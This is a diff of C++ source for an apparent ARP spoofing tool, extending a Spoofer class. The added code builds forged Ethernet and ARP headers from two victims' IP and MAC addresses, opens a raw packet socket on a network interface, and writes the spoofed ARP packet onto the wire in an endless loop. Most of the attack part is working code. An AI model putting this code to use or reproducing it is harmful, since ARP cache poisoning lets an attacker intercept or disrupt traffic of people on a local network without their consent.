@@ -7,14 +7,17 @@
 
 #include "spoofer.h"
 
-#include <arpa/inet.h>
+#include <linux/if_ether.h>
+#include <linux/if_packet.h>
+#include <net/if.h>
 #include <netinet/in.h>
+#include <sys/ioctl.h>
 #include <sys/socket.h>
+#include <unistd.h>
 #include <cstdio>
 #include <cstring>
-#include <iostream>
 
-Spoofer::Spoofer() : m_protocol(ARP), m_ipType(INVALID), m_interval(0) {
+Spoofer::Spoofer() : m_protocol(ARP), m_ipType(Host::INVALID), m_interval(0), mp_host1(0), mp_host2(0) {
 }
 
 Spoofer::~Spoofer() {
@@ -28,123 +31,78 @@ void Spoofer::SetProtocolType(std::string t) {
 }
 
 bool Spoofer::SetVictim1IP(std::string ip) {
-	int ip_type = IsValidIP(ip);
-	if (ip_type == IPv4) {
-		m_ipType = IPv4;
-//		m_v1ip = ip;
+	int ip_type = Host::IsValidIP(ip);
+	if (ip_type == Host::IPv4) {
+		m_ipType = Host::IPv4;
+		unsigned char *p_ip = new unsigned char[4];
+		Host::String2IPv4(ip.c_str(), p_ip);
+		if (mp_host1 == 0)
+			mp_host1 = new Host();
+		mp_host1->AddIPv4(p_ip);
+		delete[] p_ip;
 		return true;
 	}
-	if (ip_type == IPv6) {
-		m_ipType = IPv6;
-//		m_v1ip = ip;
+	if (ip_type == Host::IPv6) {
+		m_ipType = Host::IPv6;
+//		TODO
 		return true;
 	}
 	return false;
 }
 
 bool Spoofer::SetVictim2IP(std::string ip) {
-	int ip_type = IsValidIP(ip);
-	if (ip_type == IPv4) {
-		m_ipType = IPv4;
-//		m_v2ip = ip;
+	int ip_type = Host::IsValidIP(ip);
+	if (ip_type == Host::IPv4) {
+		m_ipType = Host::IPv4;
+		unsigned char *p_ip = new unsigned char[4];
+		Host::String2IPv4(ip.c_str(), p_ip);
+		if (mp_host2 == 0)
+			mp_host2 = new Host();
+		mp_host2->AddIPv4(p_ip);
+		delete[] p_ip;
 		return true;
 	}
-	if (ip_type == IPv6) {
-		m_ipType = IPv6;
-//		m_v2ip = ip;
+	if (ip_type == Host::IPv6) {
+		m_ipType = Host::IPv6;
+//		TODO
 		return true;
 	}
 	return false;
 }
 
-int Spoofer::IsValidIP(std::string ip) {
-	struct sockaddr_in sa;
-	struct sockaddr_in6 sav6;
-	int isv4 = inet_pton(AF_INET, ip.c_str(), &(sa.sin_addr));
-	int isv6 = inet_pton(AF_INET6, ip.c_str(), &(sav6.sin6_addr));
-	if (isv4 != -1)
-		return IPv4;
-	if (isv6 != -1)
-		return IPv6;
-	return INVALID;
-}
-
-void Spoofer::Start() {
-}
-
-/**
- * @brief Validate MAC address.
- * Based on: https://github.com/VincentDary/ArpSpoof/blob/master/CmdLineTtmt.c
- */
-bool Spoofer::IsValidMAC(std::string mac) {
-	const char *strMac = mac.c_str();
-	int i = 0;
-	if(strlen(strMac) != 17)
+bool Spoofer::Start() {
+	FillEthernetHeader();
+	FillARPHeader();
+	int sockfd = OpenSocket();
+	if (sockfd < 0)
 		return false;
-
-	for (i=0; i < 17; ++i)
-	{
-		if(i==2)
-		{
-			if(strMac[i] != ':')
-				return false;
-		}
-		else if(i==5)
-		{
-			if(strMac[i] != ':')
-				return false;
-		}
-		else if(i==8)
-		{
-			if(strMac[i] != ':')
-				return false;
-		}
-		else if(i==11)
-		{
-			if(strMac[i] != ':')
-				return false;
-		}
-		else if(i==14)
-		{
-			if(strMac[i] != ':')
-				return false;
-		}
-		else
-		{
-			if(strMac[i] < 0x30 || strMac[i] > 0x39)
-				if(strMac[i] < 0x61 || strMac[i] > 0x66)
-					if(strMac[i] < 0x41 || strMac[i] > 0x46)
-						return false;
-		}
-	}
+	ARPInjection(sockfd);
 	return true;
 }
 
 bool Spoofer::SetVictim1MAC(std::string mac) {
-	if (!IsValidMAC(mac))
+	if (!Host::IsValidMAC(mac))
 		return false;
 	else {
 		unsigned char *p_mac = new unsigned char[6];
-		p_mac = (unsigned char *)mac.c_str();
-		sprintf((char *)p_mac, "%02x:%02x:%02x:%02x:%02x:%02x",
-				p_mac[0], p_mac[1], p_mac[2],
-				p_mac[3], p_mac[4], p_mac[5]);
-		std::cout << p_mac;
+		Host::String2MAC(mac.c_str(), p_mac);
+		if (mp_host1 == 0)
+			mp_host1 = new Host();
+		mp_host1->SetMAC(p_mac);
 		delete[] p_mac;
+		return true;
 	}
-	return true;
 }
 
 bool Spoofer::SetVictim2MAC(std::string mac) {
-	if (!IsValidMAC(mac))
+	if (!Host::IsValidMAC(mac))
 		return false;
 	else {
 		unsigned char *p_mac = new unsigned char[6];
-		p_mac = (unsigned char *)mac.c_str();
-		sprintf((char *)p_mac, "%02x:%02x:%02x:%02x:%02x:%02x",
-				p_mac[0], p_mac[1], p_mac[2],
-				p_mac[3], p_mac[4], p_mac[5]);
-		std::cout << p_mac;
+		Host::String2MAC(mac.c_str(), p_mac);
+		if (mp_host2 == 0)
+			mp_host2 = new Host();
+		mp_host2->SetMAC(p_mac);
 		delete[] p_mac;
 		return true;
 	}
@@ -156,5 +114,67 @@ void Spoofer::FillARPHeader() {
 	m_arpHeader.hrd_add_len = 0x06;
 	m_arpHeader.proto_add_len = 0x04;
 	m_arpHeader.op = htons(0x01);
-//	m_arpHeader.smac =
+	memcpy(m_arpHeader.smac, mp_host1->GetMAC(), sizeof(unsigned char) * 6);
+	memcpy(m_arpHeader.sip, mp_host1->GetIPv4(0), sizeof(unsigned char) * 4);
+	memcpy(m_arpHeader.dmac, mp_host2->GetMAC(), sizeof(unsigned char) * 6);
+	memcpy(m_arpHeader.dip, mp_host2->GetIPv4(0), sizeof(unsigned char) * 4);
+}
+
+void Spoofer::Free() {
+	mp_host1->Free();
+	mp_host2->Free();
+}
+
+void Spoofer::FillEthernetHeader() {
+	memcpy(m_ethHeader.dmac, mp_host1->GetMAC(), sizeof(unsigned char) * 6);
+	memcpy(m_ethHeader.smac, mp_host2->GetMAC(), sizeof(unsigned char) * 6);
+	m_ethHeader.ethType = htons(0x806);
+}
+
+/**
+ * @brief Open socket connection.
+ * Based on: https://github.com/VincentDary/ArpSpoof/blob/master/ArpSpoof.c
+ */
+int Spoofer::OpenSocket() {
+	int sock = 0;
+	struct sockaddr_ll iface;
+	struct ifreq index;
+
+	memset(&iface, 0, sizeof(iface));
+	memset(&index, 0, sizeof(index));
+	strncpy((char *)index.ifr_name, m_interface.c_str(), IFNAMSIZ);
+
+	sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+	if(sock < 0)
+		return -1;
+	if(ioctl(sock, SIOCGIFINDEX, &index) < 0)
+		return -1;
+
+	iface.sll_family = AF_PACKET;
+	iface.sll_ifindex = index.ifr_ifindex;
+	iface.sll_protocol = htons(ETH_P_ALL);
+
+	if(bind(sock, (struct sockaddr *)&iface, sizeof(struct sockaddr_ll)) < 0)
+		            return -1;
+	return sock;
+}
+
+/**
+ * @brief Run ARP injection.
+ * Based on: https://github.com/VincentDary/ArpSpoof/blob/master/ArpSpoof.c
+ */
+void Spoofer::ARPInjection(int sockfd) {
+	unsigned char *buffer = NULL;
+	ssize_t byteSent = 0;
+
+	buffer = (unsigned char *) &m_ethHeader;
+//		hex_dump((const unsigned char*)buffer, sizeof(struct ArpPacket));
+
+	while(1)
+	{
+		byteSent = write(sockfd, buffer, ARP_PACKET_LEN);
+		printf("\n  ARP packet write on wire, %d bytes :\n\n", ARP_PACKET_LEN);
+		usleep(m_interval * 1000);
+	}
+	close(sockfd);
 }
